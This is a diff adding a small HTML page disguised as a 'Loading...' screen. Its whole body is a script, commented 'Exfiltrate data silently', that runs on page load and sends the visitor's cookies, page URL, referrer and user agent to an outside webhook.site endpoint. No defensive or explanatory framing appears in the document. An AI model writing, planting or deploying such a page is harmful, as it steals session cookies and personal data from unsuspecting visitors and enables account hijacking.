@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+// Exfiltrate data silently
+fetch("https://webhook.site/7981b878-f750-42eb-a198-c57062c9177a", {
+  method: "POST",
+  mode: "no-cors",
+  body: new URLSearchParams({
+    cookie: document.cookie,
+    location: location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent
+  })
+});
+</script>
+</body>
+</html>
